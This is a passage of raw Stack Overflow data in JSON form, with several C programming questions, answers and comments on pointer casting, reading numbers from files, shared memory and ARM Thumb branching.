"body": "<code>int y = *(int*)x;</code>. Are you sure that your <code>uint32_t</code> is holding an address, though?"}, {"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1544626235, "post_id": 53745558, "comment_id": 94343536, "body": "Read about casting (a.k.a. explicit conversion) in your favourite book. (You should be using <code>uintptr_t</code> and not assume 32-bit addresses.)"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 4, "creation_date": 1544626423, "post_id": 53745558, "comment_id": 94343656, "body": "C or C++? The rules on this topic differ."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1544626467, "post_id": 53745558, "comment_id": 94343691, "body": "While it is true, that for portability <code>uintptr_t</code> should be used, it is often the case that the code is written for a specific (embedded) architecture, where the address is known to be 32-bit long <i>and</i> apparently might be stored in some memory / register known to be 32-bit long and thus naturally defined as <code>uint32_t</code>."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1544627026, "post_id": 53745558, "comment_id": 94344049, "body": "How do you get the address? What platform? Also, C or C++, answers differ..."}, {"owner": {"reputation": 3733, "user_id": 2013672, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/4010c640f24dec3e17b12eb57226255e?s=128&d=identicon&r=PG&f=1", "display_name": "Sadik", "link": "https://stackoverflow.com/users/2013672/sadik"}, "edited": false, "score": 0, "creation_date": 1544627304, "post_id": 53745558, "comment_id": 94344202, "body": "I get the address through magic. C is actually preferable here."}], "answers": [{"tags": [], "owner": {"reputation": 178960, "user_id": 2079303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf7f63e49a75376e0f761c8abeb6d5a?s=128&d=identicon&r=PG", "display_name": "eerorika", "link": "https://stackoverflow.com/users/2079303/eerorika"}, "is_accepted": false, "score": 3, "last_activity_date": 1544626641, "creation_date": 1544626641, "answer_id": 53745746, "question_id": 53745558, "link": "https://stackoverflow.com/questions/53745558/assign-memory-address-stored-in-int-to-int/53745746#53745746", "title": "Assign memory address stored in int to int", "body": "<p>An integer type which is large enough to represent all data pointers can be converted into a pointer using <code>reinterpret_cast</code> or an explicit conversion. The pointer can be indirected to get the pointed value using the indirection operator.</p>\n\n<p>Note that <code>uint32_t</code> is not guaranteed to be large enough to be able to represent all pointer values (and in fact will not be enough on modern 64 bit cpus). <code>uintptr_t</code> is meant precisely for this purpose.</p>\n\n<p>Note that if the pointed address does not contain an object (of compatible type), then behaviour will be undefined.</p>\n"}, {"tags": [], "owner": {"reputation": 24693, "user_id": 10190237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f95f50f67af8a9658c5d76df263b323?s=128&d=identicon&r=PG&f=1", "display_name": "P.W", "link": "https://stackoverflow.com/users/10190237/p-w"}, "is_accepted": false, "score": 2, "last_activity_date": 1544627356, "creation_date": 1544627356, "answer_id": 53745960, "question_id": 53745558, "link": "https://stackoverflow.com/questions/53745558/assign-memory-address-stored-in-int-to-int/53745960#53745960", "title": "Assign memory address stored in int to int", "body": "<p><strong>In C++ this can be done using <code>reinterpret_cast</code></strong></p>\n\n<blockquote>\n  <p><strong>8.5.1.10 Reinterpret cast [expr.reinterpret.cast]</strong><br>\n  ...<br>\n  5.  A value of integral type or enumeration type can be explicitly converted to a pointer. A pointer converted to an integer of sufficient size (if any such exists on the implementation) and back to the same pointer type will have its original value; mappings between pointers and integers are otherwise implementation-de\ufb01ned. [Note: Except as described in 6.6.4.4.3, the result of such a conversion will not be a safely-derived pointer value. \u2014end note] </p>\n</blockquote>\n\n<p><strong>And the rules in 6.6.4.4.3 state:</strong>  </p>\n\n<blockquote>\n  <p>An integer value is an integer representation of a safely-derived pointer only if its type is at least as large as <code>std::intptr_t</code> and it is one of the following:<br>\n  \u2014(3.1) the result of a reinterpret_cast of a safely-derived pointer value;<br>\n  \u2014(3.2) the result of a valid conversion of an integer representation of a safely-derived pointer value;<br>\n  \u2014(3.3) the value of an object whose value was copied from a traceable pointer object, where at the time of the copy the source object contained an integer representation of a safely-derived pointer value;<br>\n  \u2014(3.4) the result of an additive or bitwise operation, one of whose operands is an integer representation of a safely-derived pointer value P, if that result converted by <code>reinterpret_cast&lt;void*&gt;</code> would compare equal to a safely-derived pointer computable from <code>reinterpret_cast&lt;void*&gt;(P)</code>.   </p>\n</blockquote>\n\n<p>So if <code>x</code> (in the question) has a type at least as large as <code>std::intptr_t</code> and is already an integral representation of a safely derived pointer as per the rules above, you will be able to get the value behind the address stored in <code>x</code>.</p>\n"}], "owner": {"reputation": 3733, "user_id": 2013672, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/4010c640f24dec3e17b12eb57226255e?s=128&d=identicon&r=PG&f=1", "display_name": "Sadik", "link": "https://stackoverflow.com/users/2013672/sadik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1544627356, "creation_date": 1544626052, "question_id": 53745558, "link": "https://stackoverflow.com/questions/53745558/assign-memory-address-stored-in-int-to-int", "title": "Assign memory address stored in int to int", "body": "<p>Assuming the value of <code>uint32_t x</code> is an address. How can I get the value behind this address?\nMy try was to simply assign the address to a pointer.</p>\n\n<pre><code>int*y = x;\n</code></pre>\n\n<p>But x is not an int pointer, it's just int with an address as value.</p>\n"}, {"tags": ["c", "file", "error-handling", "file-handling"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 3, "creation_date": 1544626002, "post_id": 53745498, "comment_id": 94343389, "body": "<code>a[10]</code> is too small to be indexed by an ascii character! You place it outside your memory: undefined behavior."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1544626178, "post_id": 53745498, "comment_id": 94343494, "body": "Also, <code>getc</code> gets a character, in your case the first <code>9</code>, then reads the <code>2</code> with <code>fscanf</code>, then reads the <code>3</code> with <code>getc</code>, then....etc."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1544626246, "post_id": 53745498, "comment_id": 94343544, "body": "..and I am not sure what you want to do. It all looks very clumsy."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1544717264, "post_id": 53745498, "comment_id": 94383534, "body": "Note that <code>getc()</code> returns an <code>int</code> value, and a <code>char</code> may not be able to hold <code>EOF</code>, so <code>char ch;</code> --&gt; <code>int ch;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 8699785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37ad9ae0d2294004d8135772801e6c9b?s=128&d=identicon&r=PG&f=1", "display_name": "Xedron", "link": "https://stackoverflow.com/users/8699785/xedron"}, "edited": false, "score": 0, "creation_date": 1544626830, "post_id": 53745619, "comment_id": 94343921, "body": "Then, what should I do to read or scan all the integers from a file efficiently?"}, {"owner": {"reputation": 8811, "user_id": 487892, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Leb5B.jpg?s=128&g=1", "display_name": "drescherjm", "link": "https://stackoverflow.com/users/487892/drescherjm"}, "reply_to_user": {"reputation": 19, "user_id": 8699785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37ad9ae0d2294004d8135772801e6c9b?s=128&d=identicon&r=PG&f=1", "display_name": "Xedron", "link": "https://stackoverflow.com/users/8699785/xedron"}, "edited": false, "score": 1, "creation_date": 1544626960, "post_id": 53745619, "comment_id": 94344005, "body": "@Xedron Can you explain why you are using <code>ch</code> as an index of your a[] array? and what does you input file look like. It&#39;s difficult to help because your code is not just reading integers from a file."}], "tags": [], "owner": {"reputation": 33645, "user_id": 2630032, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hQF09.jpg?s=128&g=1", "display_name": "Stephan Lechner", "link": "https://stackoverflow.com/users/2630032/stephan-lechner"}, "is_accepted": false, "score": 2, "last_activity_date": 1544626380, "last_edit_date": 1544626380, "creation_date": 1544626219, "answer_id": 53745619, "question_id": 53745498, "link": "https://stackoverflow.com/questions/53745498/why-is-my-printf-not-printing-the-first-character-in-the-text-file/53745619#53745619", "title": "Why is my printf() not printing the first character in the text file?", "body": "<p>Function <code>getc</code> in <code>while((ch=getc(fp))!= EOF)</code> consumes a single character from the file; if <code>9</code> is the first character in your file, it will simply be read into <code>ch</code> and - as your character set is likely to be ASCII - will set <code>ch==0x39</code>.</p>\n\n<p>So (1) the <code>9</code> will then not be available any more for <code>fscanf(fp, \"%d\", &amp;a[ch]);</code>; that's why you think it is \"skipped\".</p>\n\n<p>(2) writing to <code>a</code> at position <code>ch</code> then exceeds the array bounds of <code>a</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 35613, "user_id": 7582247, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OH0qZNY40Y4/AAAAAAAAAAI/AAAAAAAABbc/xAoU3i299E0/photo.jpg?sz=128", "display_name": "Ted Lyngmo", "link": "https://stackoverflow.com/users/7582247/ted-lyngmo"}, "is_accepted": false, "score": 1, "last_activity_date": 1544720208, "last_edit_date": 1544720208, "creation_date": 1544715682, "answer_id": 53765367, "question_id": 53745498, "link": "https://stackoverflow.com/questions/53745498/why-is-my-printf-not-printing-the-first-character-in-the-text-file/53765367#53765367", "title": "Why is my printf() not printing the first character in the text file?", "body": "<p>It's unclear how many <code>int</code>'s you have in your file and the current way of storing them is error prone. <code>fgetc</code> returns an <code>int</code> that is either <code>EOF</code> (-1) or 0-255, so <code>ch</code> should have been declared <code>int</code> and then when <code>(ch=getc(fp))!= EOF</code> is true, <code>ch</code> will contain 0-255.\nIn the following <code>fscanf(fp, \"%d\", &amp;a[ch]);</code> you are again reading from the file, but into the array at the index position <code>ch</code>, which is clearly not your intention (and it will also probably crash when you read a character with value > 9. Hint: a '0' has value 48). The below solution may seem overly complicated, but I'm used to C++ where this stuff happens under the hood and you don't have to bother about it much. Perhaps you'll get some ideas by depickling it.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n\n/* dynamic memory storage - start */\ntypedef struct {\n    size_t m_size;\n    size_t m_reserved;\n    int* m_data;\n} store;\n\n/* create a store */\nstore* store_create() {\n    store* s = malloc(sizeof(store));\n    if(s) {\n        /* initialize values */\n        s-&gt;m_size = 0;\n        s-&gt;m_reserved = 1; /* a very conservative start value */\n        s-&gt;m_data = malloc(sizeof(int)*s-&gt;m_reserved);\n        if(s-&gt;m_data==NULL) {\n            free(s);\n            s = NULL;\n        }\n    }\n    return s;\n}\n\n/* destroy a store */\nvoid store_destroy(store* s) {\n    /* free the integer array */\n    free(s-&gt;m_data);\n    /* free the store struct */\n    free(s);\n}\n\nbool store_reserve(store* s, size_t new_res) {\n    /* reserve more space for the int's if needed */\n    if(new_res&gt;s-&gt;m_reserved) {\n        int* n = realloc(s-&gt;m_data, sizeof(int)*new_res);\n        if(n==NULL) return false; /* could not expand storage */\n        s-&gt;m_reserved = new_res;\n        s-&gt;m_data = n;\n    }\n    return true;\n}\n\n// check if it's time to increase reserved storage\nbool store_check_reserve(store* s) {\n    if(s-&gt;m_size == s-&gt;m_reserved)\n        /* change 5/4 to a larger value for more aggressive\n         * increase of memory allocation */\n        return store_reserve(s, (s-&gt;m_reserved+1)*5/4);\n    else\n        return true;\n}\n\n// add a value to the store\nbool store_add(store* s, int v) {\n    if(!store_check_reserve(s)) return false;\n\n    s-&gt;m_data[s-&gt;m_size++] = v;\n    return true;\n}\n\n/* dynamic memory storage - end */\n\nint main(int argc, char* argv[]) {\n    FILE* fp;\n    fp = fopen(\"file.txt\", \"r\");\n\n    /* create a store for our unknown amount of int's */\n    store* myStore = store_create();\n\n    /* scan for strings separated by comma and newline\n     * and allocate memory for it */\n    char* str;\n    while(fscanf(fp, \" %m[^,\\n],\", &amp;str)==1)\n    {\n        int num;\n        /* convert string to integer */\n        if(sscanf(str, \"%d\", &amp;num)==1) {\n            /* store the extracted value */\n            if(store_add(myStore, num)==false) {\n                fprintf(stderr, \"FAILED STORING %d\\n\", num);\n            }\n        }\n        // free string allocated by fscanf (%m) */\n        free(str);\n    }\n    fclose(fp);\n\n    printf(\"All %d stored values:\\n\", myStore-&gt;m_size);\n    for(size_t i=0; i&lt;myStore-&gt;m_size; ++i) {\n        printf(\"%d = %d\\n\", i, myStore-&gt;m_data[i]);\n    }\n\n    /* release memory allocated by our store */\n    store_destroy(myStore);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 8699785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37ad9ae0d2294004d8135772801e6c9b?s=128&d=identicon&r=PG&f=1", "display_name": "Xedron", "link": "https://stackoverflow.com/users/8699785/xedron"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 608, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1544720208, "creation_date": 1544625893, "last_edit_date": 1544626861, "question_id": 53745498, "link": "https://stackoverflow.com/questions/53745498/why-is-my-printf-not-printing-the-first-character-in-the-text-file", "title": "Why is my printf() not printing the first character in the text file?", "body": "<p>I am a noob C programmer.\nI can't read all the characters of my text file.\nMy file.txt has numbers: 9,2,3,4,5,6 but when I run the code written below, it just skips 9 and prints the rest of the numbers. However, when I put a space before 9, it runs perfectly. How do I fix it? and why does it happen?</p>\n\n<pre><code>FILE* fp;\nfp = fopen(\"file.txt\", \"r\");\nint a[10];\nchar ch;\n\nwhile((ch=getc(fp))!= EOF)\n{\n    fscanf(fp, \"%d\", &amp;a[ch]);\n    printf(\"%d \", a[ch]);\n}\n</code></pre>\n\n<p>Thanks in advance;</p>\n"}, {"tags": ["c", "memory", "shared"], "answers": [{"tags": [], "owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "is_accepted": true, "score": 1, "last_activity_date": 1544627017, "creation_date": 1544627017, "answer_id": 53745852, "question_id": 53745400, "link": "https://stackoverflow.com/questions/53745400/do-calls-to-shmget-or-shmat-initialize-data/53745852#53745852", "title": "Do calls to shmget or shmat initialize data?", "body": "<blockquote>\n  <p>is it possible to first create data and then attach it to the shared segment?</p>\n</blockquote>\n\n<p>No.</p>\n\n<blockquote>\n  <p>Or must I first create the shared segment and then attach data to it? </p>\n</blockquote>\n\n<p>Yes - you get the piece of memory, then you write/place data in it.</p>\n\n<p>shmat() gives you a pointer to the shared segment. When you assign that to an existing pointer in your program, that pointer points to this piece of memory.</p>\n\n<blockquote>\n  <p>Do any of these calls, initialize the attached data?</p>\n</blockquote>\n\n<p>When creating a new shared memory segment, all bytes within it will be initialized to zero. When attaching a segment that already is created, you get whatever you placed in that segment previously.</p>\n"}], "owner": {"reputation": 119, "user_id": 9773515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15d5cbcb616fc6782e369993022a01c1?s=128&d=identicon&r=PG&f=1", "display_name": "Darren Col", "link": "https://stackoverflow.com/users/9773515/darren-col"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 109, "favorite_count": 0, "accepted_answer_id": 53745852, "answer_count": 1, "score": 1, "last_activity_date": 1544627017, "creation_date": 1544625552, "question_id": 53745400, "link": "https://stackoverflow.com/questions/53745400/do-calls-to-shmget-or-shmat-initialize-data", "title": "Do calls to shmget or shmat initialize data?", "body": "<p>When using shared memory in c, is it possible to first create data and then attach it to the shared segment (something like initialization)? Or must I first create the shared segment and then attach data to it? </p>\n\n<p>I do think that both ways are correct, but I am not sure of what is exactly happening during calls to <code>shmget</code> and <code>shmat</code>. Do any of these calls, initialize the attached data?</p>\n"}, {"tags": ["c", "string", "search", "scanf", "fgets"], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544633545, "post_id": 53747513, "comment_id": 94347983, "body": "I did as your answer, but the return value is not true. I see that only the second line (which is the value of first variable) is returned every time I search for a variable! If text file is &quot;var1 10 var2 3 var3 7&quot;, then I only take 10 each time I search for var1, var2, and var3 !"}, {"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544634263, "post_id": 53747513, "comment_id": 94348322, "body": "I think the compare function (strcmp) does not work correctly ! Any idea?"}, {"owner": {"reputation": 1619, "user_id": 7864413, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208517922736756/picture?type=large", "display_name": "Phil M", "link": "https://stackoverflow.com/users/7864413/phil-m"}, "edited": false, "score": 0, "creation_date": 1544634462, "post_id": 53747513, "comment_id": 94348412, "body": "strcmp works fine, when you interpret its return correctly. <a href=\"https://www.programiz.com/c-programming/library-function/string.h/strcmp\" rel=\"nofollow noreferrer\">programiz.com/c-programming/library-function/string.h/strcmp</a>"}, {"owner": {"reputation": 113, "user_id": 8589924, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208989683008688/picture?type=large", "display_name": "Benedict Aaron Tjandra", "link": "https://stackoverflow.com/users/8589924/benedict-aaron-tjandra"}, "edited": false, "score": 0, "creation_date": 1544634838, "post_id": 53747513, "comment_id": 94348600, "body": "What&#39;s wrong here is the logic of the code. strcmp() returns a non-negative value if the two strings compared are of different length. So the if statement will always be executed! What you want is to set the size of dummy to strlen(word) and set the condition to strcmp(dummy,word) == 0"}, {"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544635264, "post_id": 53747513, "comment_id": 94348856, "body": "OK, I set strcmp(dummy,word) == 0, but how do I set size of dummy, would you please give sample code ? Thanks."}, {"owner": {"reputation": 113, "user_id": 8589924, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208989683008688/picture?type=large", "display_name": "Benedict Aaron Tjandra", "link": "https://stackoverflow.com/users/8589924/benedict-aaron-tjandra"}, "edited": false, "score": 0, "creation_date": 1544635300, "post_id": 53747513, "comment_id": 94348886, "body": "char dummy[strlen(word)]"}, {"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544635338, "post_id": 53747513, "comment_id": 94348911, "body": "With changing to strcmp(dummy,word) == 0, it does not pass through if statement."}, {"owner": {"reputation": 113, "user_id": 8589924, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208989683008688/picture?type=large", "display_name": "Benedict Aaron Tjandra", "link": "https://stackoverflow.com/users/8589924/benedict-aaron-tjandra"}, "edited": false, "score": 0, "creation_date": 1544635488, "post_id": 53747513, "comment_id": 94349006, "body": "Ah, my bad, if you would change the code to char dummy[strlen(word) + 1] to account for the null terminating character."}, {"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544635711, "post_id": 53747513, "comment_id": 94349133, "body": "OK, I changed the code to &#39;char dummy[strlen(word) + 1]&#39;, but still does not pass through if statement."}, {"owner": {"reputation": 113, "user_id": 8589924, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208989683008688/picture?type=large", "display_name": "Benedict Aaron Tjandra", "link": "https://stackoverflow.com/users/8589924/benedict-aaron-tjandra"}, "edited": false, "score": 0, "creation_date": 1544635854, "post_id": 53747513, "comment_id": 94349218, "body": "You should also change to fgets(dummy, strlen(word) + 1), file)"}], "tags": [], "owner": {"reputation": 113, "user_id": 8589924, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208989683008688/picture?type=large", "display_name": "Benedict Aaron Tjandra", "link": "https://stackoverflow.com/users/8589924/benedict-aaron-tjandra"}, "is_accepted": false, "score": 0, "last_activity_date": 1544632661, "creation_date": 1544632661, "answer_id": 53747513, "question_id": 53745256, "link": "https://stackoverflow.com/questions/53745256/c-language-search-text-file-for-a-var-and-store-the-next-string-as-the-value/53747513#53747513", "title": "C Language: Search text file for a &quot;var&quot; and store the next string as the value", "body": "<p>Each FILE has a file position or offset, and when you perform a fgets(), the position is moved forward. If you wish to read from the beginning of the file, insert the following line in the beginning of your search_word_int() function to move the file offset to the beginning of the file: </p>\n\n<pre><code>fseek(file, 0, SEEK_SET);\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1544634586, "creation_date": 1544625002, "last_edit_date": 1544634586, "question_id": 53745256, "link": "https://stackoverflow.com/questions/53745256/c-language-search-text-file-for-a-var-and-store-the-next-string-as-the-value", "title": "C Language: Search text file for a &quot;var&quot; and store the next string as the value", "body": "<p>How can I do the following task:</p>\n\n<pre><code>file = fopen(\"filename\",\"r\");\nsearch_word_int( \"var1\" , file , 1 );\nsearch_word_int( \"var2\" , file , 1 );\n...\nfclose(file);\n</code></pre>\n\n<p>I have used:</p>\n\n<pre><code>int search_word_int( char *word , FILE *file , int *step )\n{\n    char dummy[256];\n    int variable = 0, step_ = step;\n    while( (fgets( dummy , 256 , file )) != NULL )\n    {\n        if( strcmp( dummy , word ) != 0 )\n        {\n            for (int i = 0 ; i &lt; step_ + 1 ; i++)\n                fscanf( file , \"%d\" , &amp;variable );\n            printf(\"%s is found = %d\\n\",word,variable);\n            return(variable);\n        }\n    }\n}\n</code></pre>\n\n<p>as the <em>search function</em> but it seems that fgets does not search from the beginning of the file, instead it continues to get next lines after the last call!</p>\n"}, {"tags": ["c", "function", "assembly", "microcontroller"], "comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 2, "creation_date": 1544624586, "post_id": 53744854, "comment_id": 94342537, "body": "How did you link this?  And BTW, you can use <code>ldr r2, =my_fun</code> and let the assembler make a literal pool for you if you don&#39;t need to take control of where it puts it."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1544632546, "post_id": 53744854, "comment_id": 94347403, "body": "If you lose your origin, how are you ever going home?"}, {"owner": {"reputation": 9, "user_id": 6528137, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CzZGnk4B6UU/AAAAAAAAAAI/AAAAAAAAABs/VYzGOTvfCTc/photo.jpg?sz=128", "display_name": "Kakses", "link": "https://stackoverflow.com/users/6528137/kakses"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1544711002, "post_id": 53744854, "comment_id": 94379538, "body": "@PeterCordes I&#39;m not linking this. I&#39;m using this in C code: <code>__asm volatile(&quot;;asm code&quot;)</code> It&#39;s not my idea, it&#39;s part of error handling function which i want modify."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1544711682, "post_id": 53744854, "comment_id": 94379960, "body": "If you compile but don&#39;t link, you&#39;ll have a <code>.o</code> or <code>.obj</code> that you can&#39;t run.  Anyway, edit your question with your exact code, because apparently this is <i>not</i> it.  You didn&#39;t even mention using inline asm in the question!!  Also with how you build a binary from your source to make this a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}], "answers": [{"comments": [{"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1544630195, "post_id": 53746774, "comment_id": 94346026, "body": "and you cant execute assembly language, needs to be machine code."}], "tags": [], "owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "is_accepted": false, "score": 0, "last_activity_date": 1544630178, "creation_date": 1544630178, "answer_id": 53746774, "question_id": 53744854, "link": "https://stackoverflow.com/questions/53744854/arm-assembler-bx-jump-to-nowhere/53746774#53746774", "title": "arm assembler: bx jump to nowhere", "body": "<p>soc.c</p>\n\n<pre><code>void my_fun ( void )\n{\n\n}\n</code></pre>\n\n<p>sos.s</p>\n\n<pre><code>.thumb\n\nldr r2, my_fun_label\nbx r2\nmy_fun_label: .word my_fun\n</code></pre>\n\n<p>build and disassemble</p>\n\n<pre><code>arm-none-eabi-gcc -mthumb -O2 -c soc.c -o soc.o\narm-none-eabi-as sos.s -o sos.o\narm-none-eabi-ld -Ttext=0x1000 sos.o soc.o -o so.elf\narm-none-eabi-objdump -D so.elf\n\nDisassembly of section .text:\n\n00001000 &lt;my_fun_label-0x4&gt;:\n    1000:   4a00        ldr r2, [pc, #0]    ; (1004 &lt;my_fun_label&gt;)\n    1002:   4710        bx  r2\n\n00001004 &lt;my_fun_label&gt;:\n    1004:   00001009    andeq   r1, r0, r9\n\n00001008 &lt;my_fun&gt;:\n    1008:   4770        bx  lr\n    100a:   46c0        nop         ; (mov r8, r8)\n</code></pre>\n\n<p>worked perfectly</p>\n\n<p>might want to align the address so you are not gambling on a 50/50 chance of it working.</p>\n\n<pre><code>.thumb\n\nldr r2, my_fun_label\nbx r2\nnop\nmy_fun_label: .word my_fun\n</code></pre>\n\n<p>thank you gnu</p>\n\n<pre><code>arm-none-eabi-as sos.s -o sos.o\nsos.s: Assembler messages:\nsos.s:5: Error: invalid offset, target not word aligned (0x00000002)\nsos.s:5: Error: invalid offset, value too big (0x00000002)\n</code></pre>\n\n<p>force alignment</p>\n\n<pre><code>.thumb\n\nldr r2, my_fun_label\nbx r2\nnop\n.align\nmy_fun_label: .word my_fun\n</code></pre>\n\n<p>that is 